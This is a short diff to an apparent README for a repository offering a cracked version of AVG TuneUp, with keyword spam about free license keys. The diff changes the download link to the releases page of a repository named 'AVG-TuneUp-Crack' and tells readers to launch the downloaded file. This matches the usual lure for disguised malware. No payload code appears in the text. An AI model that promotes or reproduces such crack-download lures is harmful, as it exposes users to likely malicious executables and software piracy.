@@ -26,7 +26,7 @@ avg pc tuneup 2011 download, avg pc tuneup free license key, free tuneup avg, av
 - free-tuneup-avg
 
 ## Get Started
-Click [here](https://github.com/uploads/App.zip) to take your PC's performance to the next level!
+Click [here](https://github.com/PEAKUNGMASTER/AVG-TuneUp-Crack/releases) to take your PC's performance to the next level!
 
 🔥 **Launch the file to start optimizing your system with AVG TuneUp!** 🔥
 
